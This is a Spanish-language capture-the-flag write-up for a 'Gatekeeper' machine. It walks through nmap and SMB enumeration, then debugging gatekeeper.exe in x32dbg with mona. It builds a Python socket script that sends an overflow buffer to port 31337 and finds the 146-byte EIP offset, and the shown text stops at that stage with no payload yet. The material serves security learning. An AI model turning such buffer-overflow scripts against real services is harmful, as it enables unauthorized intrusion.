# Write-Up-Gatekeeper

#ENUMERACIÒN
# Nmap 

```nmap -sC -sV -T5 -Pn -vv (target ip)``` 

![1](https://user-images.githubusercontent.com/107126653/172824365-26348884-9465-4f47-b226-978733daace3.png)

Me pareció interesante el puerto 31337

usamos smb con el objetivo de bajarnos a nuestra maquina el archivo gatekeeper.exe

```smbclient   \\\\(target ip)\\Users``` 

![2](https://user-images.githubusercontent.com/107126653/172825695-899cc3c4-025e-4050-a6a8-726666a6649b.png)

comandos a usar en windows 
```
dir  Sirve para listar todo el directorio donde nos encontremos
cd   Sirve para entrar en un directorio
get  Sirve para descargar archivos.
```
![3](https://user-images.githubusercontent.com/107126653/172828200-c67f82ad-e3ad-4ac3-be18-3b50155d167d.png)

![4](https://user-images.githubusercontent.com/107126653/172828211-2e385488-94a6-42b2-b1cb-8a8a19ef91c6.png)

![5](https://user-images.githubusercontent.com/107126653/172828227-78e3710c-5de9-4307-9e8c-1c600759750a.png)

Una vez descargado el archivo estarà donde hayamos ejecutado el SMBCLIENT en este caso la carpeta personal , con un ```ls```

![6](https://user-images.githubusercontent.com/107126653/172828677-6e0f5f1b-509b-4494-8a82-694483cf3fef.png)

Para el siguiente paso utilizaremos una herramienta muy util ```X32dgb.exe``` https://github.com/therealdreg/x64dbg-exploiting , sería aconsejable que te lo instalases.

#X32DBG

![7](https://user-images.githubusercontent.com/107126653/172829871-0ad55dd2-2f4a-439c-b883-34f5cdfbbf5e.png)

Abrimos el archivo gatekeeper.exe

![8](https://user-images.githubusercontent.com/107126653/172830228-d21c80fa-b25e-46d8-a012-a09f480d2c31.png)
 
 Te encuentras con esta MARAVILLA si , impresiona, tranquilo yo te lo explico . Ve por un cafè y disfruta.
  
 ![10](https://user-images.githubusercontent.com/107126653/172830838-bfab15d9-dbf3-4960-be82-7a2793c7b1e5.png)

Nos vamos  LOG  (arriba a la izquierda)

*Cuando estemos en LOG abajo de LOG en command: introducimos estos comandos siempre que reiniciamos/apagamos la maquina.
```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```
![12](https://user-images.githubusercontent.com/107126653/172831935-42213adf-0878-4945-945a-27f0566e9c10.png)

Si te ha salido esto, tranquilo no te alarmes . ¡VAMOS BIEN!.

```
mona.mona("pattern_create 2000")
```
Utilizamos este comando para generar 2000 bytes  unicos en  que este write up  son las idoneas.

![13](https://user-images.githubusercontent.com/107126653/172833016-434f5a8a-2730-49ca-bc20-f4effdfdd7da.png)

lo copiamos! y nos vamos a un .PY que nos vamos a crear un script que va realizar un EXPLOIT.
También sería aconsejable bajarnos ```NOTEPAD ++```

*importante  dale guarda como (nombre que quieras) con la extension .py  

```
import socket

ip = "IP"
port = 31337



shellcode  = 

  
#badchars 
buf =  "\x41" * (CANTIDAD DE A)
buf +=  "DIRECCION DE RETORNO"
buf += shellcode


 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buf + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```
Puedes utilizar esta plantilla. En IP primero probamos con local host ```127.0.0. 1```


![15](https://user-images.githubusercontent.com/107126653/172839502-88c90fdb-6601-4e96-8df9-d539bcd07eeb.png)

pegamos los 2000 bytes en SHELLCODE entre ' '  o " ". ( te tiene que salir en color gris en vez de en negro). con un CONTROL + S guardamos.

Volvemos al X32DBG pulsa restart (arriba izq). Pulsamos run (flecha derecha). Ahora vamos a ejecutar el .py desde una CMD (simbolo del sistema) , en mi caso me instale la ultima version de python 3.10. si te 
lo instalas de forma generica. estarà localizado aquì. 

```C:\Users\xpl\Desktop>C:\Users\xpl\AppData\Local\Programs\Python\Python310\python.exe gatekeeper.writeup.py```

*xpl por que estoy ejecutando x32dgb en un windows.

![16](https://user-images.githubusercontent.com/107126653/172840003-058d226a-aed6-4c7b-91b1-293a7b11a625.png)

Si esta todo correcto deberìa salir asì.

Ahora vamos al x32dbg y en EIP hacemos copy y en log utilizaremos este comando ```mona.mona("pattern_offset EIP")``` en lugar de EIP pegamos ( no hace falta copiar y pegar pero es una praxis).

![17](https://user-images.githubusercontent.com/107126653/172841149-844eb476-8c1d-4fa6-a8d1-004de3492eea.png)
Ahora nos indicarà una cantidad de bytes que llena hasta llegar a EIP , que tenemos que introducir.

modificamos ahora en el .py
```
import socket

ip = "127.0.0.1"
port = 31337


#badchars 
buf   = "\x41" * 146
buf  += "\x42" * 4
 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buf + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
CONTROL + S
Tiene que quedar asì.

*para que todo sea mas clara la mecanica sera mayormente serà: modificamos el python, debug restart , ejecutamos el py. del CMD.

Vemos en CPU . Que EIP esta al completo de 42 (B) En hexadecimal.
![18](https://user-images.githubusercontent.com/107126653/172842784-2bf73437-6ea0-401b-b5e4-166d3a15e9a4.png)


para ASEGURARNOS de que la pila esta correctamente posicionada hacemos lo siguiente CLICK DERECHO :

![19 2](https://user-images.githubusercontent.com/107126653/172844121-5a38c6bc-6fdd-4492-828f-d69b7798fdd7.png)


![19](https://user-images.githubusercontent.com/107126653/172843848-dcc8699c-7580-44cc-831d-2efdc16053d7.png)
 
 Vemos que todo esta bien posicionado y SEGUIMOS!
